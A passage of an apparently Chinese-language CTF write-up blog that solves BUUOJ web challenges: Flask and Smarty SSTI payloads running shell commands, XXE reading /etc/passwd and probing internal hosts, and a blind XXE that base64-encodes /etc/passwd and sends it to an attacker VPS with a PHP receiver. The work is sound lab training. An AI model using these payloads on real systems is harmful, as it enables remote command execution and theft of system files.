                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        rv <span class="token operator">=</span> num

<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200805174234.png" alt="image-20200805174234566"></p> <p>输入PIN码之后用os模块为所欲为</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200805174402.png" alt="image-20200805174402883"></p> <h3 id="flasklight"><a href="#flasklight" class="header-anchor">#</a> flasklight</h3> <p>直接利用GitHub的<a href="https://github.com/F4ded/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection" target="_blank" rel="noopener noreferrer">这个项目<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>中所给的<code>subprocess.Popen.</code>这个模块的payload来打</p> <p>寻找该模块的exp：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree

url <span class="token operator">=</span> <span class="token string">'http://fb81170e-ce76-45d4-8d45-c1ff9ba2f3e1.node3.buuoj.cn/?search={{[].__class__.__base__.__subclasses__()}}'</span>
res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
<span class="token comment"># Xpath:/html/body/h3[1]</span>
html <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
a <span class="token operator">=</span> html<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">&quot;/html/body/h3[1]/text()&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

context <span class="token operator">=</span> a<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;,&quot;</span><span class="token punctuation">)</span>
count <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> context<span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">&quot;subprocess.Popen&quot;</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>context<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>


<span class="token comment">#print(context)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p>最后payload：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">258</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>stdout<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>

<span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">258</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat /flasklight/coomme_geeeett_youur_flek'</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>stdout<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h3 id="ciscn2019华东南赛区web11"><a href="#ciscn2019华东南赛区web11" class="header-anchor">#</a> CISCN2019华东南赛区Web11</h3> <p><strong>考点：</strong></p> <ul><li><strong>Smarty SSTI</strong></li></ul> <div class="custom-block note"><p class="custom-block-title">笔记</p> <p>Smarty是一个PHP的模板引擎，提供让程序逻辑与页面显示（HTML/CSS）代码分离的功能。</p></div> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003205817.png" alt="image-20201003205810665"></p> <p>根据题目的提示，可以知道是<code>Smarty</code>模板，经过简单的Google之后发现这个模板存在SSTI漏洞，估计这个题目就是考的这一点。</p> <p>页面的右上角会显示我们的<code>IP</code>地址，猜想可以通过修改XFF头来造成SSTI，于是我将XFF头改成了<code>{1+1}</code>：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003210249.png" alt="image-20201003210249780"></p> <p>确实存在XFF头处的SSTI，然后经过简单的查询之后，发现使用<code>{$smarty.version}</code>来显示当前模板的版本。</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003210356.png" alt="image-20201003210352836"></p> <p>然后发现Smarty的<code>{if xxx}{/if}</code>类似于Flask，可以执行PHP代码：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003210743.png" alt="image-20201003210616454"></p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token shell-comment comment"># payload</span>

<span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">if</span><span class="token punctuation">}</span>

<span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">if</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003210924.png" alt="image-20201003210828917"></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003210930.png" alt="image-20201003210853494"></p> <h2 id="xss"><a href="#xss" class="header-anchor">#</a> XSS</h2> <p>暂无</p> <h2 id="xxe"><a href="#xxe" class="header-anchor">#</a> XXE</h2> <h3 id="true-xml-cookbook"><a href="#true-xml-cookbook" class="header-anchor">#</a> True XML cookbook</h3> <p><strong>考点：</strong></p> <ul><li><strong>XXE内网探测</strong></li> <li><strong>Linux关键文件位置</strong></li></ul> <p>输入用户名密码，抓包发现是XML格式的数据：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200726113603.png" alt="image-20200726112333098"></p> <p>尝试用XXE读取敏感文件：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200726113607.png" alt="image-20200726112425979"></p> <p>读取成功，payload如下：</p> <div class="language-xml line-numbers-mode"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>但是经过其他尝试之后没有发现flag，接着读取一下/etc/hosts，发现一个IP地址：<img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200726113643.png" alt="image-20200726113642963"></p> <p>这里很可能是要做内网探测了，先尝试用http协议访问一下该ip地址：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200726112922.png" alt="image-20200726112922755"></p> <p>报错了，那么接下来就爆破一下内网的主机：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200726113056.png" alt="image-20200726113050786"></p> <p>题目还是比较友好，在17126.2011这台主机中发现了flag。</p> <p>payload:</p> <div class="language-xml line-numbers-mode"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM &quot;http://17126.2010&quot;&gt;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h3 id="suctf-2018-homework"><a href="#suctf-2018-homework" class="header-anchor">#</a> [SUCTF 2018]Homework</h3> <p><strong>考点：</strong></p> <ul><li><strong>PHP原生类<code>SimpleXMLElement</code>进行Blind XXE</strong></li> <li><strong>二次注入</strong></li></ul> <h4 id="知识点"><a href="#知识点" class="header-anchor">#</a> 知识点</h4> <p>PHP的原生类<code>SimpleXMLElement</code>的<code>__construct</code>方法可以用来加载一个远程的xml文件：<a href="https://www.php.net/manual/zh/simplexmlelement.construct.php" target="_blank" rel="noopener noreferrer">官方文档<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>我这里就截张图简单的说一下：</p> <p><img src="https://i.loli.net/2020/11/16/CtISpThkgUlfGob.png" alt="image-20201116203313138"></p> <p>主要是第二个参数<code>options</code>，官方中默认使用了一些预定义常量来作为它的值，如果要进行外部实体注入的话，这里要填的是<code>LIBXML_NOENT</code>，这个参数允许解析外部实体，同样，在官方文档中也提示了它的安全问题：</p> <p><img src="https://i.loli.net/2020/11/16/4B1f7SOMuEs3nrq.png" alt="image-20201116203618811"></p> <h4 id="解题"><a href="#解题" class="header-anchor">#</a> 解题</h4> <p>进入环境给了一个calc的类：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token keyword">class</span> <span class="token class-name">calc</span><span class="token punctuation">{</span>
	<span class="token keyword">function</span> <span class="token function">__construct__</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token function">calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">function</span> <span class="token function">calc</span><span class="token punctuation">(</span><span class="token variable">$args1</span><span class="token punctuation">,</span><span class="token variable">$method</span><span class="token punctuation">,</span><span class="token variable">$args2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token variable">$args1</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$args1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$args2</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$args2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">case</span> <span class="token single-quoted-string string">'a'</span><span class="token punctuation">:</span>
				<span class="token variable">$method</span><span class="token operator">=</span><span class="token double-quoted-string string">&quot;+&quot;</span><span class="token punctuation">;</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>

			<span class="token keyword">case</span> <span class="token single-quoted-string string">'b'</span><span class="token punctuation">:</span>
				<span class="token variable">$method</span><span class="token operator">=</span><span class="token double-quoted-string string">&quot;-&quot;</span><span class="token punctuation">;</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>

			<span class="token keyword">case</span> <span class="token single-quoted-string string">'c'</span><span class="token punctuation">:</span>
				<span class="token variable">$method</span><span class="token operator">=</span><span class="token double-quoted-string string">&quot;*&quot;</span><span class="token punctuation">;</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>

			<span class="token keyword">case</span> <span class="token single-quoted-string string">'d'</span><span class="token punctuation">:</span>
				<span class="token variable">$method</span><span class="token operator">=</span><span class="token double-quoted-string string">&quot;/&quot;</span><span class="token punctuation">;</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>
			
			<span class="token keyword">default</span><span class="token punctuation">:</span>
				<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;invalid input&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token variable">$Expression</span><span class="token operator">=</span><span class="token variable">$args1</span><span class="token punctuation">.</span><span class="token variable">$method</span><span class="token punctuation">.</span><span class="token variable">$args2</span><span class="token punctuation">;</span>
		<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;\$r=<span class="token interpolation"><span class="token variable">$Expression</span></span>;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Calculation results:&quot;</span><span class="token punctuation">.</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>		
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br></div></div><p>点击CALC按钮会返回计算结果，抓包查看：</p> <p><img src="https://i.loli.net/2020/11/16/BK3yvgFqUE5HRaT.png" alt="image-20201116203850149"></p> <p>结合它给的源码，不难猜测每个参数的意义：</p> <ul><li>module：调用的类</li> <li>args[]：一个数组，分别为$args1,$method,$args2</li></ul> <p>在<code>__construct</code>方法中调用了<code>calc()</code>方法，所以这里可以触发计算结果的原因很可能是new了一个<code>calc</code>对象，这样可以触发构造方法，从而调用<code>calc()</code>方法，从而计算了结果。</p> <p>结合之前所说的<code>SimpleXMLElement#__construct</code>方法，我们可以在远程VPS构造一个XML文件，然后利用这个方法进行远程加载，造成XXE，远程VPS的XML文件：</p> <p>test.xml</p> <div class="language-xml line-numbers-mode"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">try</span><span class="token punctuation">[</span><span class="token internal-subset">
&lt;!ENTITY % int SYSTEM &quot;http://{IP}/xxe/evil.xml&quot;&gt;
%int;
%all;
%send;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>evil.xml</p> <div class="language-xml line-numbers-mode"><pre class="language-xml"><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;
&lt;!ENTITY % all &quot;&lt;!ENTITY <span class="token entity" title="&amp;#37;">&amp;#37;</span> send SYSTEM 'http://{IP}/xxe/test.php?file=%file;'&gt;&quot;&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>test.php</p> <div class="language-xml line-numbers-mode"><pre class="language-xml"><code>&lt;?php
file_put_contents('1.txt',$_GET['file']);
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>加载xml文件：</p> <p><img src="https://i.loli.net/2020/11/16/Gx2OMYiLHnkRrE3.png" alt="image-20201116204647559"></p> <p>这里注意<code>options</code>参数，我们如果直接传预定义的常量名的话会被当成字符串解析，所以这里应该传入常量的值（经过我的测试16也可以）：</p> <p><img src="https://i.loli.net/2020/11/16/8tPE7xrildGWHVq.png" alt="image-20201116204829354"></p> <p>然后到VPS上收数据：</p> <p><img src="https://i.loli.net/2020/11/16/hzqXiGAlSMONakW.png" alt="image-20201116205943243"></p> <p>接着就可以拿源码了，过程我就不多说了，我直接说拿到源码之后的利用方式：</p> <p>function.php</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">function</span> <span class="token function">sql_result</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token variable">$mysql</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$mysql</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token variable">$result_array</span><span class="token operator">=</span><span class="token function">mysqli_fetch_all</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token variable">$result_array</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
                 <span class="token keyword">echo</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$mysql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                 <span class="token keyword">return</span> <span class="token double-quoted-string string">&quot;Failed&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token variable">$mysql</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'size'</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token number">2</span><span class="token operator">*</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;File is larger than 2M, forbidden upload&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">sql_result</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;select * from file where filename='&quot;</span><span class="token punctuation">.</span><span class="token function">w_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;'&quot;</span><span class="token punctuation">,</span><span class="token variable">$mysql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                                <span class="token variable">$filehash</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sql_result</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;insert into file(filename,filehash,sig) values('&quot;</span><span class="token punctuation">.</span><span class="token function">w_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;','&quot;</span><span class="token punctuation">.</span><span class="token variable">$filehash</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;',&quot;</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token function">w_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'sig'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;)&quot;</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token double-quoted-string string">&quot;&quot;</span><span class="token punctuation">:</span><span class="token function">w_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'sig'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;)&quot;</span><span class="token punctuation">,</span><span class="token variable">$mysql</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token double-quoted-string string">&quot;Failed&quot;</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Upload failed&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token variable">$new_filename</span><span class="token operator">=</span><span class="token double-quoted-string string">&quot;./upload/&quot;</span><span class="token punctuation">.</span><span class="token variable">$filehash</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;.txt&quot;</span><span class="token punctuation">;</span>
                                <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$new_filename</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Upload failed&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Your file &quot;</span><span class="token punctuation">.</span><span class="token function">w_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot; upload successful.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
